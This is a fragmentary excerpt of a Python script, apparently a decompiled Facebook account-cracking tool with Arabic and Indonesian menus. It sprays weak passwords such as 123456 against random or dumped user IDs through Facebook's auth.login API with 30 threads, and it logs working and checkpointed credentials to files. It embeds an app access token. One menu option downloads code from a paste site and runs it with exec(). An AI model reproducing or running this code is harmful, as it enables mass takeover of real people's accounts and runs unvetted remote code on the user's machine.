...
an2 = datetime.datetime(2024, 1, 26, 0, 00, 0)
hours = (now.hour)
code = 'YOUSEF-CODE'
...
import mechanize
import datetime
#name = input('\x1b[1;32m password \x1b[1;31m=\x1b[1;33m=\x1b[1;34m=\x1b[1;35m>\x1b[1;32m')
#print('\x1b[1;32m')
#print('\x1b[2;31m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#if name == '1':
   ## print('\x1b[1;35m=\x1b[1;31m=\x1b[1;34m>\x1b[1;32m ✅')
    #print('\x1b[1;34m=\x1b[1;33m=\x1b[1;31m>\x1b[1;32m الرمز صح تم تسجيل دخول ')
##else:
  #  print('\x1b[1;31m كلمة سر غلط حبي ')
#    exit()
print(('—'*25)+'\n• DeCoDe By @F_1_9 •\n'+('—'*25))
print('\n\n\n')
...
def first():
    clear()
    print(logo)
    print(' [!] \x1b[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL\x1b[1;0m\n')
...
def name():
    clear()
    print(logo)
    print('\n [O] OK RESULT SAVED TO : \x1b[1;92mOK/%s\x1b[1;97m\n [C] CP RESULT SAVED TO : \x1b[1;91mCP/%s\x1b[1;97m\n [G] \x1b[1;96mGUNAKAN MODE PESAWAT 5 DETIK\x1b[1;0m\n' % (okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
...
def name2():
    clear()
    print(logo)
    print('\n [O] baker OK TERSIMPAN DI : \x1b[1;92mOK/%s\x1b[1;97m\n [C] HASIL CP TERSIMPAN DI : \x1b[1;91mCP/%s\x1b[1;97m\n [O] \x1b[1;96mON/OFF MODE PESAWAT JIKA TIDAK ADA HASIL\x1b[1;0m\n' % (okc, cpc))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf = yuzong.split('|')[0]
            nmf = yuzong.split('|')[1].lower()
...
def crack(idf, pwv):
    ...
    fff = '%'
    (sys.stdout.write('\r %s[ 𝑫𝒂𝒓𝒘𝒊𝒏 ] %s•%s • OK:%s • CP:%s  ' % (bi, loop, len(id2), len(ok), cp)),)
    sys.stdout.flush()
    ...
    for pw in pwv:
        ...
        try:
            ...
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp += 1
                print(f'''\r\x1b[1;91m [ 𝑫𝒂𝒓𝒘𝒊𝒏-CP ] {idf} | {pw}''')
...
def kilwaplus():
    ...
    import requests
    kilwa = "https://paste.tc/raw/decodeklwa"
    kil = requests.get(kilwa)
    code = kil.text
    exec(code)
...
class Main:
    ...
    def __init__(self):
        ...
        print('')
        print('\x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('[1] صيد حسابات فيسبوك عشوائية قوية  ')
        print('[02] الانتقال لاداة الصيد من الملف & الايديات من بـ كوكيز')                                             
        print('\x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        TUTUL = input('  اختار : ')
        if TUTUL in ('2', '02'):
            kilwaplus()
        if TUTUL in ('852', '0552'):
            Public()
        if TUTUL in ('34649', '076493'):
            os.system('python Dump.py')
        if TUTUL in ('76494', '046794'):
            self.old()
        if TUTUL in ('1', '01'):
            self.old2()
            exit()
    ...
    def old(self):
        ...
        try:
            ...
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print('\n\x1b[1;32m [!] USE (123456) FOR IDZ\x1b[1;37m ')
                ...
                os.system('clear')
                print(logo)
                print('\x1b[95m[H] الهم صلى على محمد وال محمد ')
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r [ @F_1_9 ] %s/%s -> Ok:-%s - Cp:-%s ' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ...
            if 'session_key' in response.text and 'EAAA' in response.text:
                print('\r \x1b[0;92m[ baker-OK ] %s | %s\x1b[0;97m         ' % (uid, pw))
                print('\r \x1b[0;92m Congrats Bro ')
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-baker-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
            
            if 'www.facebook.com' in response.json()['error_msg']:
                print('\r \x1b[0;92m[ AMIR-OK ] %s | %s\x1b[0;97m         ' % (uid, pw))
    ...
    def old2(self):
        ...
        os.system('clear')
        print(logo)
        limit = int(input('\n \x1b[0;93mD A R W I N - كم ايدي تريد تصيد 5000 افضل شي : '))
        ...
        try:
            ...
            print('\x1b[0;93m [+] TOTAL ID -> \x1b[0;91m%s\x1b[0;97m' % len(self.id))
            with ThreadPoolExecutor(max_workers=30) as coeg:
                print(' \x1b[0;93mK I L W A - افضل الشي 123456 او 123456789 ')
                listpass = input(' ادخل الباسورد اللي تريد ينصاد عليه الحسابات : ')
                if len(listpass) <= 5:
                    exit('\n%s [!] PASSWORD MINIMUM 6 CHARACTERS' % B)
                print('%s [*] CRACK WITH PASSWORD -> [\x1b[0;91m%s\x1b[0;93m]' % (G, listpass))
    ...
    def api(self, uid, pwx):
        ...
        sys.stdout.write('\r \033[2;36m• \033[2;32m D A R W I N \033[2;36m• \033[1;97m%s/%s \033[2;32mOK \033[1;33m>\033[1;34m> \033[2;32m%s • CP \033[2;36m>\033[1;33m> %s .....' % (self.loop, len(self.id), len(self.cp), len(self.ok)))
        sys.stdout.flush()
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ...
            response = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers)
            if 'session_key' in response.text and 'EAAA' in response.text:
                okkil = ('''\r\x1b[1;32m 𝑫𝒂𝒓𝒘𝒊𝒏 جابلك حساب فيسبوك شغال ⚡🔥
• DeCoDe By @F_1_9
•••••••••••••••••••••••••••••••••••••••••••
...
•••••••••••••••••••••••••••••••••••••••••••
• DeCoDe By @F_1_9
دز صور الصيد لـ 𝑫𝒂𝒓𝒘𝒊𝒏⚡🔥

•••••••••••••••••••••••••••••••••••••••••••

ـ <@F_1_9> + <https://t.me/RDQRR>  ''' % (uid, pw))
                print(okkil)
                self.ok.append('%s|%s' % (uid, pw))
                open('2009-AMIR-Ok.txt', 'a').write(' %s|%s\n' % (uid, pw))
            ...
            if 'www.facebook.com' in response.json()['error_msg']:
                cpkil = (''' \r\x1b[1;32m 𝑫𝒂𝒓𝒘𝒊𝒏جابلك حساب فيسبوك سكيور ⚡🔥
• DeCoDe By @F_1_9
•••••••••••••••••••••••••••••••••••••••••••
...
def Subscraption():
    ...
    if 1==1:
        ...
        print(logo)
        print('')
        print(' \x1b[1;32m Chang Toll Paid You Need Get Approved First\x1b[1;37m\n')
